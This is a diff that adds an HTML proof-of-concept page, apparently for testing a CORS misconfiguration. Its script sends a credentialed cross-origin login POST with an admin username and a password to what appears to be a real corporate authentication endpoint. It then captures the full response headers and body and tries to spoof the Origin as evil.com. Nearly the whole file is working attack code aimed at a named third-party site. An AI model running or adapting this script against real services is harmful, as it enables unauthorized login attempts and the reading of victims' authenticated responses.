@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h2>Full CORS Response Capture PoC</h2>
+    <pre id="output">Loading...</pre>
+
+    <script>
+      var xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://in1.web-login.gs.com/nf/auth/doAuthentication.do", true);
+      xhr.withCredentials = true;
+
+      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+
+      // NOTE: Will be ignored by browsers (you can't set Origin manually client-side)
+      xhr.setRequestHeader("Origin", "https://evil.com");
+
+      xhr.onreadystatechange = function () {
+        if (xhr.readyState === XMLHttpRequest.DONE) {
+          var fullResponse = {
+            url: xhr.responseURL,
+            status: xhr.status,
+            statusText: xhr.statusText,
+            headers: xhr.getAllResponseHeaders(),
+            body: xhr.responseText
+          };
+
+          console.log("Full CORS Response:", fullResponse);
+
+          document.getElementById("output").innerText =
+            "Response URL: " + fullResponse.url + "\n" +
+            "Status: " + fullResponse.status + " " + fullResponse.statusText + "\n\n" +
+            "Headers:\n" + fullResponse.headers + "\n" +
+            "Body:\n" + fullResponse.body;
+        }
+      };
+
+      var postData =
+        "samlToggle=false&login=admin&passwd=124578985623&regionListDropdown=in1.web-login.gs.com&loginBtn=Login&StateContext=bG9naW5zY2hlbWE9U0FNTA%3D%3D";
+
+      xhr.send(postData);
+    </script>
+  </body>
+</html>
